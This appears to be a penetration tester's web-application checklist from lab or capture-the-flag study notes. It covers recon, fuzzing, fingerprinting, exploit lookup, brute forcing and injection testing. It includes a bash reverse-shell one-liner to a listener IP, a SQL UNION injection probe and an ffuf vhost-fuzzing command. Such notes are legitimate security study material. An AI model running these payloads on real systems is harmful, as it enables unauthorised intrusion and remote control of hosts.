### 1. Add domain to `/etc/hosts`
### 2. Run Discovery/Page Brute-Force
- First Fuzz without extension
- Fuzz with extension (find it first)
### 3. Look in robots.txt file or sitemaps.xml for hidden endpoints**
- http://www.example.com/robots.txt
### 4. Run subdomain/vhost brute force discovery
- Run **subdomain brute force discovery (External Only)**
- Run **vhosts brute force discovery (Internal & External)**
### 5. Crawl the webpage for all links
- **Web Crawling / Robots**
- Crawling with **FinalRecon**
- Crawling with **ZAP Proxy**
### 6. Look for comments in HTML for sensitive information
- Check all crawled and discovered pages
**1. Capture server errors (e.g., 500, 403) that might leak tech stack info**

---

**2. Look for vulnerabilities in Web Server technologies being used**

- Use **Wappalyzer** to discover web server technologies in browser
    
- Use **BuiltWith** to discover web server technologies (External only)
    
- Use **WhatWeb CLI tool** to discover web server technologies
    
- Scan the webserver with **Nikto** to discover web technologies and vulnerabilities
    
- Scan the webserver with **Nmap** and web discovery scripts
    
- Attempt banner grabbing the webserver with **curl**
    
- Discover Web Application Firewalls (WAFs) with **Wafw00f**
    

---

**3. Look for web service versions on discovered pages (Jenkins, WP, blog platforms, etc.). Use enumeration techniques depending on technology**

- Look for CMS or app-specific files (wp-content, .git/, etc.)
    
    - **WordPress Enumeration**
        
    - **Joomla Enumeration**
        
    - **Drupal Enumeration**
        
    - **Tomcat Enumeration**
        
    - **Jenkins Enumeration**
        
    - **IIS Tilde Enumeration**
        
    - **Other**
        

---

**4. Look for vulnerabilities in discovered web service versions and/or technologies**

- Search **Metasploit** for service exploits with the discovered version
    
- Search **ExploitDB** for service exploits with the discovered version
    

---

**5. Look at Google for tech version exploits**

**10. Look for vulnerabilities in discovered web service versions and/or technologies**

- Search **metasploit** for service exploits with the discovered version
    
- Search **ExploitDB** for service exploits with the discovered version
    
- Search Google for “<Service> <Version> Exploit GitHub”
    

---

**11. Look for login pages to test default or weak credentials**

- **Default Credential lists**
    
- **Login Brute Forcing**
    
    - ✔ Check for **password reset** or **recovery mechanisms**
        
    - ✔ Review **cookies & sessions** (flags like Secure, HttpOnly)
        
    - ✔ Test for **session fixation** or missing **CSRF protections**
        

---

**12. Look for input fields to submit data**

- **Intercepting Web Requests**
    

---

**13. Test submitting data on EVERY user input field and looking at interaction with Burp Suite**

- If input appears to be used in a system command, **test for command injection**
    
- If a file upload functionality exists, **test for file upload vulnerabilities**
    
- If the webserver appears to be populating data from a database, **test for SQL Injection**
    
    - Test for **SQL UNION Injection** separately (`test' UNION select 1--`)
        
- If Accounts, Pages, or other things on the webpage seem to be sequential and accessible in a GET or POST request, **check for IDOR vulnerabilities**
    
- If GET parameters seem to be taking local files on the system, **test for file inclusion vulnerabilities / path traversal**
    
- **Check user input fields for XSS**
    
- Check different **HTTP verbs** to bypass access controls or injection validations
    
- If XML input is accepted, **test for XML External Entity (XXE) vulnerabilities**
    

---

**14. If the webserver has a web socket or API that is reachable, check if the POST/GET requests are injectable with SQLMAP**

- **Websocket / API Injection**
    

---

**Shells and Payloads**

1. **Linux Reverse Shells**
    
2. **Windows Reverse Shells**
    
3. **Web Reverse Shells**
    
4. **Going from webshell to reverse shell on Linux:**
    
    - `bash -c 'bash -i >& /dev/tcp/10.10.14.8/7777 0>&1'`
        
    - Make sure to URL encode the payload


### Vhost Discovery

```BASH
└─$ ffuf -u http://inlanefreight.htb:43220/ -H "Host: FUZZ.inlanefreight.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc all  -fs 120 
```